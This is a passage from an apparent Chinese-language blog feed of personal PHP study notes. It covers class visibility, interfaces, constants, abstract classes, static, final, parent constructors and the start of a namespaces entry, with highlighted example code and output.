class="line"><span class="php">$myclass-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass2</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 此方法为公有</span></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPublic();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyProtected();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myclass2 = <span class="keyword">new</span> MyClass2;</span></span><br><span class="line"><span class="php">$myclass2-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php">$myclass2-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;testPrivate();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;testPublic();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span> </span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myFoo = <span class="keyword">new</span> foo();</span></span><br><span class="line"><span class="php">$myFoo-&gt;test(); <span class="comment">// Bar::testPrivate </span></span></span><br><span class="line"><span class="php">                <span class="comment">// Foo::testPublic</span></span></span><br></pre></td></tr></table></figure></p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>使用interface来定义接口</p><p>与定义类的方法唯一不同的就是，在接口中的所有方法都是空的，而且必须为公有的，这是接口的特性</p><p>使用implements来实现接口</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 声明一个'iTemplate'接口</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 实现接口</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $vars = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;vars[$name] = $var;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $name =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">            $template = str_replace(<span class="string">'&#123;'</span> . $name . <span class="string">'&#125;'</span>, $value, $template);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $template;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用$符号</p><p>使用const关键字来定义常量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> constant = <span class="string">'常量值'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">showConstant</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>  <span class="keyword">self</span>::constant . PHP_EOL;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyClass::constant . PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$classname = <span class="string">"MyClass"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $classname::constant . PHP_EOL; <span class="comment">// 自 5.3.0 起</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> MyClass();</span></span><br><span class="line"><span class="php">$class-&gt;showConstant();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class::constant . PHP_EOL; <span class="comment">// 自 PHP 5.3.0 起</span></span></span><br></pre></td></tr></table></figure></p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>使用abstract关键字来定义抽象类</p><p>抽象方法只能在抽象类中定义，抽象类中可以定义非抽象的方法</p><p>被定义为抽象类，不能实例化为对象，必须通过继承来在子类中实现方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"> <span class="comment">// 强制要求子类定义这些方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span></span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span></span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 普通方法（非抽象方法）</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printOut</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;getValue() . PHP_EOL;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"ConcreteClass1"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass1"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"ConcreteClass2"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass2"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$class1 = <span class="keyword">new</span> ConcreteClass1;</span></span><br><span class="line"><span class="php">$class1-&gt;printOut();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class1-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$class2 = <span class="keyword">new</span> ConcreteClass2;</span></span><br><span class="line"><span class="php">$class2-&gt;printOut();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class2-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Co<span class="symbol">ncreteClass1</span></span><br><span class="line">FOO_Co<span class="symbol">ncreteClass1</span></span><br><span class="line">Co<span class="symbol">ncreteClass2</span></span><br><span class="line">FOO_Co<span class="symbol">ncreteClass2</span></span><br></pre></td></tr></table></figure></p><h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><p>static就是静态的，使用方法基本就与C++一致，可以直接访问不实例化类</p><p>静态属性不能通过一个类已实例化的对象来访问，静态方法可以</p><p>静态属性一旦定义，值就不可以再改变，并且生命周期只有程序结束时随着程序生命周期结束而结束</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="keyword">static</span> $my_static = <span class="string">'foo'</span>;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">return</span> <span class="keyword">self</span>::$my_static;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">print</span> Foo::$my_static . PHP_EOL;</span></span><br><span class="line"><span class="php">$foo = <span class="keyword">new</span> Foo();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">print</span> $foo-&gt;staticValue() . PHP_EOL;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foo</span></span><br><span class="line"><span class="attribute">foo</span></span><br></pre></td></tr></table></figure></p><h2 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h2><p>如果父类中有方法被声明为final，则子类无法覆盖该方法</p><p>如果一个类被声明为final，则不能被继承</p><h2 id="调用父类构造方法"><a href="#调用父类构造方法" class="headerlink" title="调用父类构造方法"></a>调用父类构造方法</h2><p>要执行父类的构造方法，需要在子类的构造方法中调用<code>parent::__construct()</code></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   function __construct() &#123;</span><br><span class="line">       print <span class="string">"BaseClass 类中构造方法"</span> . <span class="type">PHP_EOL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   function __construct() &#123;</span><br><span class="line">       parent::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">       print <span class="string">"SubClass 类中构造方法"</span> . <span class="type">PHP_EOL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">SubClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">OtherSubClass</span>();</span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br><span class="line"><span class="keyword">SubClass </span>类中构造方法</span><br><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP的面向对象基本与C++一致，含义也基本相同，不多说</p><p>2.调用父类的构造函数需要使用<code>parent::__construct()</code></p><p>3.静态属性一旦定义，值就不可以再改变，并且生命周期只有程序结束时随着程序生命周期结束而结束</p><p>4.PHP继承时没有访问控制之分，默认为public，继承父类中除了private的所有属性和方法</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面向对象&quot;&gt;&lt;a href=&quot;#面向对象&quot; class=&quot;headerlink&quot; title=&quot;面向对象&quot;&gt;&lt;/a&gt;面向对象&lt;/h1&gt;&lt;p&gt;面向对象已经很熟悉了，基本上就一句话总结，类是虚指，对象是类的实例&lt;/p&gt;
&lt;h2 id=&quot;对象内容&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/9-学习日记</title>
    <link href="http://yoursite.com/2020/07/09/PHP-2020-7-9-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/09/PHP-2020-7-9-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-09T12:55:35.000Z</published>
    <updated>2020-07-09T13:18:50.191Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><p>namespace在C++里见过，use namespace std;</p><p>命名空间可以解决两类问题</p><ul><li>用户编写的代码与PHP内部的类/常量/函数或第三方类/函数/常量之间的名字冲突</li><li>为很长的标识符名称创建一个别名或简称，提高代码的可读性</li></ul><h2 id="定义命名空间"><a href="#定义命名空间" class="headerlink" title="定义命名空间"></a>定义命名空间</h2><p>默认情况下，所有常量，函数和类都放在全局空间下，就和PHP支持命名空间之前一样</p><p>命名空间使用namespace关键字来声明。如果一个文件中包含命名空间，它必须在其他所有代码之前声明命名空间</p><p>语法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="comment">// 定义代码在 'MyProject' 命名空间中  </span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;  </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// ... 代码 ...</span></span></span><br></pre></td></tr></table></figure></p><p>你也可以在同一个文件中定义不同的命名空间代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">AnotherProject</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br></pre></td></tr></table></figure></p><p>这种写法一般是不建议的，所以为了提高代码的可读性，使用大括号的形式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">AnotherProject</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。且全局代码必须用一个不带名称的namespace语句加上大括号括起来</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123; // 全局代码</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$a = MyProject\connect();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyProject\Connection::start();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的declare语句。所有非PHP代码包括空白符都不能出现在命名空间的声明之前<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">declare</span>(encoding=<span class="string">'UTF-8'</span>); <span class="comment">//定义多个命名空间和不包含在命名空间中的代码</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">MyProject</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">const</span> CONNECT_OK = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span>  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123; // 全局代码</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$a = MyProject\connect();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyProject\Connection::start();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>如果写成这样就会出现语法错误</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">MyProject</span>; <span class="comment">// 命名空间前出现了“&lt;html&gt;” 会致命错误 -　命名空间必须是程序脚本的第一条语句</span></span></span><br></pre></td></tr></table></figure><h2 id="子命名空间"><a href="#子命名空间" class="headerlink" title="子命名空间"></a>子命名空间</h2><p>与目录和文件的关系很像，PHP命名空间也允许指定层次化的命名空间的名称。因此，命名空间的名字可以使用分层次的方式定义</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 